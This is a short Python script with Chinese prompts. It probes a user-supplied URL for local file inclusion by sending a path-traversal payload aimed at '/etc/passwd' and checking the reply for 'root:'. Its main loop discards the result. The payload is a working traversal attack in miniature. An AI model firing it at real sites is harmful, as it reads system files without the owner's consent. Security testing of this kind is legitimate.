import requests
from colorama import init, Fore

init(autoreset=True)


def detect_file_inclusion(url, file_param):
    payload = {
        file_param: "../../../../../../etc/passwd"
    }

    try:
        response = requests.get(url, params=payload)

        if "root:" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False



if __name__ == '__main__':
    while True:
        input_url = input("请输入URL（输入 q 退出）：")
        if input_url.lower() == "q":
            break

        file_param = input("请输入用于文件包含的参数名：")

        detect_file_inclusion(input_url, file_param)
